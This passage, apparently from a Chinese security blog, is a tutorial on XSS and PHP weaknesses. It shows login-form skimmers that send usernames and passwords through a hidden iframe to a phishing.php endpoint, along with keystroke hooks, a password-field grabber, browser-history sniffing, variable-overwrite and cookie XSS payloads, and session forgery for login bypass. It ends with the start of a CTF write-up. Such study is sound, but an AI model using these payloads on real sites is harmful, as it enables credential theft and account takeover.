class="string">&quot;iframe&quot;</span>);</span><br><span class="line">iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>; </span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">Form</span>.<span class="property">user</span>.<span class="property">value</span>); </span><br><span class="line">iframe.<span class="property">src</span> = <span class="string">&quot;http://127.0.0.1/....php?user=&quot;</span>+<span class="title class_">Form</span>.<span class="property">user</span>.<span class="property">value</span> + <span class="string">&quot;&amp;pass=&quot;</span> + <span class="title class_">Form</span>.<span class="property">pass</span>.<span class="property">value</span>; <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">&#125; </span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>这段代码用来截取用户在登录页面输入的用户名和密码信息，然后提交给当前创建的 PHP<br>脚本.</p><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> loginForm = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27; userslogin &#x27;</span>]; </span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">parseData</span>(<span class="params"></span>)  &#123;  </span><br><span class="line"><span class="keyword">var</span> user = loginForm.<span class="property">user</span>.<span class="property">value</span>; </span><br><span class="line"> <span class="keyword">var</span> pass = loginForm.<span class="property">pass</span>.<span class="property">value</span>; </span><br><span class="line"> <span class="title function_">saveData</span>(username,password); </span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"> &#125;  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveData</span>(<span class="params">username,password</span>)  &#123;  </span><br><span class="line"><span class="keyword">var</span> frame=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>); </span><br><span class="line">frame.<span class="property">src</span>=<span class="string">&quot; http://127.0.0.1/phishing.php?user=&quot;</span> + user + <span class="string">&quot;&amp;pass=&quot;</span> + pass;  frame.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&#x27;none&#x27;</span>;  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(frame); </span><br><span class="line"> &#125;  </span><br><span class="line">loginForm.<span class="property">onsubmit</span> = parseData; </span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>这段代码也会获取和记录用户所提交的信息，同实例一。</p><h3 id="劫持链接的onclick"><a href="#劫持链接的onclick" class="headerlink" title="劫持链接的onclick"></a>劫持链接的onclick</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="variable language_">document</span>.<span class="property">links</span>.<span class="property">length</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">links</span>[i].<span class="property">onclick</span> = hijack; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="监听键盘的onkeydown"><a href="#监听键盘的onkeydown" class="headerlink" title="监听键盘的onkeydown"></a>监听键盘的onkeydown</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span>=<span class="keyword">function</span>(<span class="params">e</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!e)e=<span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="title function_">hijack</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(ex)</span><br><span class="line">&#123; &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="劫持表单的输入框"><a href="#劫持表单的输入框" class="headerlink" title="劫持表单的输入框"></a>劫持表单的输入框</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">onkeyup</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;PassFormlogin&#x27;</span>].<span class="property">onsubmit</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">&#123;    pwd = <span class="variable language_">this</span>.<span class="property">PassInputUsername0</span>.<span class="property">value</span> + <span class="string">&#x27;|&#x27;</span> + <span class="variable language_">this</span>.<span class="property">PassInputPassword0</span>.<span class="property">value</span>;    </span><br><span class="line">     <span class="title function_">log</span>(<span class="built_in">escape</span>(pwd)); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JS遍历-Form-表单元素"><a href="#JS遍历-Form-表单元素" class="headerlink" title="JS遍历 Form 表单元素"></a>JS遍历 Form 表单元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">grabber</span>(<span class="params"></span>)</span><br><span class="line">&#123; </span><br><span class="line">  F = <span class="variable language_">document</span>.<span class="property">forms</span>;  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j&lt;F.<span class="property">length</span>; ++j)  </span><br><span class="line">  &#123;   </span><br><span class="line">      f = F[j];   <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;f.<span class="property">length</span>; ++i) </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">if</span> (f[i].<span class="property">type</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;password&quot;</span>)    </span><br><span class="line">      &#123;    </span><br><span class="line">         <span class="title function_">alert</span>(<span class="string">&quot;Password:&quot;</span>+f[i].<span class="property">value</span>)    </span><br><span class="line">      &#125;    <span class="keyword">else</span> <span class="keyword">if</span> (f[i].<span class="property">type</span>.<span class="title function_">toLowerCase</span>() != <span class="string">&quot;submit&quot;</span>)   </span><br><span class="line">           &#123;     </span><br><span class="line">              <span class="title function_">alert</span>(<span class="string">&quot;Text:&quot;</span>+f[i].<span class="property">value</span>)    </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">  &#125; </span><br><span class="line">&#125;  <span class="title function_">grabber</span>();</span><br></pre></td></tr></table></figure><h3 id="JS捕获用户特定按键"><a href="#JS捕获用户特定按键" class="headerlink" title="JS捕获用户特定按键"></a>JS捕获用户特定按键</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keyDown</span>(<span class="params"></span>) &#123;               </span><br><span class="line"><span class="keyword">var</span> keycode = event.<span class="property">keyCode</span>;               </span><br><span class="line"><span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);                </span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;按键码: &quot;</span> + keycode + <span class="string">&quot; 字符: &quot;</span> + realkey);           </span><br><span class="line">&#125;           </span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS-History-Hack"><a href="#XSS-History-Hack" class="headerlink" title="XSS History Hack"></a>XSS History Hack</h2><h3 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h3><blockquote><p>对于网站上超级链接，我们点击后会发现颜色出现变化，那些没发生颜色变化的正是我们没有访问过的。<br>一般来说，用户每天都会浏览许多网页，这些网页 都会被浏览器记录下来，除非用户刻意清除，否则历史 记录将一直保存在本地计算机中。倘若攻击者能获取用 户浏览器的历史记录或搜索信息，将是一件十分危险的 事，攻击者可以在此基础上进一步发起其他攻击，如社 会工程学。</p></blockquote><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>能获取浏览器的某些历史记录，其原理就是利用 CSS 能定义访问 过的和未访问过的超级链接的样式。由于 JavaScript 可以读取任何元素的 CSS 信息，自然能分辨 浏览器应用了哪种样式和用户是否访问过该链接。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">H3</span>&gt;</span>Visited<span class="tag">&lt;/<span class="name">H3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;visited&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">H3</span>&gt;</span>Not Visited<span class="tag">&lt;/<span class="name">H3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;notvisited&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="keyword">var</span> websites = [ <span class="string">&quot;http://www.baidu.com/&quot;</span>, <span class="string">&quot;http://wwww.google.com/&quot;</span>, <span class="string">&quot;http://www.sina.com.cn/&quot;</span>, <span class="string">&quot;http://www.qq.com/&quot;</span>, <span class="string">&quot;http://www.163.com/&quot;</span>, <span class="string">&quot;http://www.sohu.com/&quot;</span>, <span class="string">&quot;http://www.playsec.com/&quot;</span>, <span class="string">&quot;http://hi.baidu.com/&quot;</span>, <span class="string">&quot;http://zhidao.baidu.com/&quot;</span>, </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="string">&quot;http://www.taobao.com/&quot;</span>, <span class="string">&quot;http://weibo.com/&quot;</span>, ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; websites.<span class="property">length</span>; i++) &#123;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">link.<span class="property">id</span> = <span class="string">&quot;id&quot;</span> + i;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">link.<span class="property">href</span> = websites[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">link.<span class="property">innerHTML</span> = websites[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;style&gt;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;#id&#x27;</span> + i + <span class="string">&quot;:visited &#123;color: #FF0000;&#125;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/style&gt;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(link);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> color = <span class="variable language_">document</span>.<span class="property">defaultView</span>.<span class="title function_">getComputedStyle</span>(link,<span class="literal">null</span>).<span class="property">getPropertyValue</span> (<span class="string">&quot;color&quot;</span>);  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(link);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span> (color == <span class="string">&quot;rgb(255, 0, 0)&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> item = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">item.<span class="title function_">appendChild</span>(link);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;visited&#x27;</span>).<span class="title function_">appendChild</span>(item);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125; <span class="keyword">else</span> &#123;         </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> item = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">item.<span class="title function_">appendChild</span>(link);    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;notvisited&#x27;</span>).<span class="title function_">appendChild</span>(item);   </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span> </span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote><p>将上述代码保存到一个文档中，使用火狐打开之后，我们可以看到Visited和Not Visited 两部分，分别罗列出来我们曾经访问过的网站和没有访问过的网站。<br>出现这种效果的原因在于，我们上述的代码已经预先的把用户可能访问的网站记录下来，然后通过JS遍历列表，并利用getComputedStyle()的方法检查相应超级链接的style属性，从而辨别出浏览器是否访问过该网站。</p></blockquote><h2 id="SERVER-PHP-SELF"><a href="#SERVER-PHP-SELF" class="headerlink" title="$_SERVER[PHP_SELF]"></a>$_SERVER[PHP_SELF]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;&gt;              </span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;submitted&quot; value=&quot;1&quot; /&gt;                         </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot; /&gt;  &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>将其保存，在php下运行。</p><h3 id="产生-XSS-漏洞的原因"><a href="#产生-XSS-漏洞的原因" class="headerlink" title="产生 XSS 漏洞的原因"></a>产生 XSS 漏洞的原因</h3><blockquote><p>php echo $_SERVER[‘PHP_SELF’];<br>这行代码直接输出 PHP_SELF 变量，而该变量由用户控制。</p></blockquote><h3 id="如何规避"><a href="#如何规避" class="headerlink" title="如何规避"></a>如何规避</h3><blockquote><p>可以使用<code>htmlentities($_SERVER[‘PHP_SELF’])</code>来替代<code>$_SERVER[‘PHP_SELF’]</code>， 这样即使网址中包含恶意代码，也会被转换为用于显示的 HTML代码，而不是被直接嵌入 HTML 代码中执行。</p></blockquote><p><strong>注意：除了 PHP_SELF 之外，其他的<code>$_SERVER</code> 变量也可能存在类似漏洞，比 如 SCRIPT_URI、QUERY_STRING、PATH_INFO 等，在使用之前一定要先进行 htmlentities 之类 的转换。</strong></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>（1）register_globals&#x3D;on。<br>（2）extract()。<br>（3）遍历初始化变量。</p><h3 id="一-2"><a href="#一-2" class="headerlink" title="一"></a>一</h3><h3 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h3><p>register_globals是php.ini里的一个配置，这个配置影响到PHP如何接受传递过来的参数，当register_globals打开以后，各种变量都可以被重新注册，包括来自HTML的表单请求变量，再加上PHP在使用变量之前不需要进行初始化，这便容易写出不安全的代码，然而我们只需要开启它便可以达到我们的攻击目的。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><blockquote><p>开启r_g只需要修改PHP的配置文件php.in，在该文件中找到r_g的属性，然后把register——globals&#x3D;Off改为register_globals&#x3D;on即可。</p></blockquote><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码的输出很简单，但是<code>$a</code>事先没有初始化，访问<code>localhost/test.php?a=XSS</code>便能实现攻击。</p><h3 id="二-2"><a href="#二-2" class="headerlink" title="二"></a>二</h3><h3 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h3><blockquote><p>extract()函数，它用来将变量从数组导入到当前的符号表中</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$a</code>已经被初始化，如果直接访问该页面，输出的值为1.添加参数a后，<code>localhost/test.php?a=XSS</code>,页面输出的XSS，<code>$a</code>被重新赋值，因为使用了<code>extract($_GET);</code><br>这行代码是使用extract()覆盖所有以GET方法获取的变量，即<code>localhost/test.php?a=&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>能产生一个XSS。</p><h3 id="三-2"><a href="#三-2" class="headerlink" title="三"></a>三</h3><h3 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h3><blockquote><p>使用foreach()函数模拟全局操作</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$chs</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span> &amp;&amp; <span class="variable">$charset</span> != <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$chs</span>=<span class="keyword">new</span> <span class="title class_">Chinese</span>(<span class="string">&#x27;UTF-8&#x27;</span>,<span class="variable">$charset</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$chs</span>-&gt;<span class="title function_ invoke__">Convert</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$chs</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简化之后如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$$key</span> =$ value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:<br><code>localhost/test.php?a=XSS&amp;b=&lt;h1&gt;XSS&lt;/h1&gt;</code></p><h2 id="字符集编码隐患"><a href="#字符集编码隐患" class="headerlink" title="字符集编码隐患"></a>字符集编码隐患</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/test.php?a=xss%d5&#x27;;alert(0)//</span><br></pre></td></tr></table></figure><p><code>$a</code>为动态内容，如果直接把xss’;alert(0)&#x2F;&#x2F;赋给<code>$a</code><br><code>localhost/test.php?a=xss&#39;;alert(0)//</code><br>则会返回：<br><code>&lt;script&gt;x=&#39;xss\&#39;;alert(0)//&#39;;y=&#39;[user_input]&#39;;&lt;/script&gt;</code></p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="背景-5"><a href="#背景-5" class="headerlink" title="背景"></a>背景</h3><blockquote><p>用户在浏览网站时，该网站可能会向电脑写入一个很小的文件，这个文件记录了用户的ID，Password,Time等等，这个文件就是Cookie文件，当我们再次访问该网站时，浏览器会自动检测存储，，将本地的Cookie发送给网站，网站通过读取Cookie来获取用户的信息，做出相应的动作，例如我们经常看到的，直接登陆，除了在浏览器内存中保存的Cookie之外，大部分的Cookie会保存在本地的硬盘。</p></blockquote><h3 id="XSS基本测试"><a href="#XSS基本测试" class="headerlink" title="XSS基本测试"></a>XSS基本测试</h3><p>(1)查找HTML显示的标签，查看是否在显示区域<br>(2)如果不在，则<br><code>&lt;script&gt;alert((document.cookie)&lt;/script&gt;:普通注入</code><br><code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;:闭合标签注入</code><br><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;:闭合标签注入</code><br>读写cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class CookieTest extends HttpServlet</span><br><span class="line">&#123;</span><br><span class="line">  public void doGet(HttpServletRequest request,HttpServletResponse reponse) throws ServletException,IOException</span><br><span class="line">  &#123;</span><br><span class="line">   this.doPost(request,reponse);</span><br><span class="line">  &#125;</span><br><span class="line">  public void doPost(HttpServletRequest request,HttpServletReponse reponse) throws ServletExeption,IOException</span><br><span class="line">  &#123;</span><br><span class="line">   PrintWriter out =response.getWriter();</span><br><span class="line">   Cookie c[]=request.getCookies();</span><br><span class="line">   if(c!=null)</span><br><span class="line">   &#123;</span><br><span class="line">    for (int i=0;i&lt;c.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">     Cookie cookie=c[i];</span><br><span class="line">     out.print(&quot;Welcome&quot;+cookie.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;else</span><br><span class="line">   &#123;</span><br><span class="line">    String username=request.getParameter(&quot;username&quot;);</span><br><span class="line">    if(username!=null&amp;&amp;!&quot;&quot;.equals(username))</span><br><span class="line">    &#123;</span><br><span class="line">     Coolie ck=new Cookie(&quot;Name&quot;,username);</span><br><span class="line">     reponse.addCookie(ck);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h3><p>进行抓包，我们会发现Cookie后会带有几行密文，这就是WEB服务器向客户端发送的Cookie，当攻击者拿到这段Cookie，就可以使用当前用户的身份登陆。<br>使用Burp,add Request header，在Match输入框内输入要替换的请求头，这里为正则表达，找到该框<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e1110123fcee95b8.png" alt="图片.png">进行add添加MAtch进行匹配,MATCH:^Cookie*$,REPLACE:为自己要设置的Cookie，设置完，再次请求，发现Cookie已经变成我们刚才设置的，绕过了登陆。</p><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-84ecc77c876f5e98.png" alt="图片.png"><br>对于安全性来说SESSION的安全性比Cookie高，对于构造，我们只需在HTML代码中添加<br><code>&lt;script type=&#39;text/javascript&#39;&gt; document.cookie=&#39;PHPSESSID=123456789&#39; &lt;/script&gt;</code>类似于这样即可，重新发送，我们会发现我们 所构造的SESSION合法。</p><h3 id="如何拿到session"><a href="#如何拿到session" class="headerlink" title="如何拿到session"></a>如何拿到session</h3><p>session是可以储存在Cookie中，相当于临时cookie，它既可以通过抓包的方式展现，也可以通过构造payload<code>.../user.action;jsessionid=...</code>，SESSION是与浏览器之间的一次会话，它用来区分不同的用户，当浏览器关闭后，会随之消失，故我们需要在浏览器与服务器会话结束之前拿到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPSEC 2019 Web</title>
      <link href="/2019/03/04/WPSEC-2019-Web/"/>
      <url>/2019/03/04/WPSEC-2019-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-414f3ed62541fe04.png" alt="img"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-739cb4f7a3b3353d.png" alt="img"></p><h4 id="同时GET，POST"><a href="#同时GET，POST" class="headerlink" title="同时GET，POST"></a>同时GET，POST</h4><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><h4 id="【代码审计】之变量覆盖一"><a href="#【代码审计】之变量覆盖一" class="headerlink" title="【代码审计】之变量覆盖一"></a>【代码审计】之变量覆盖一</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable !</span><br><span 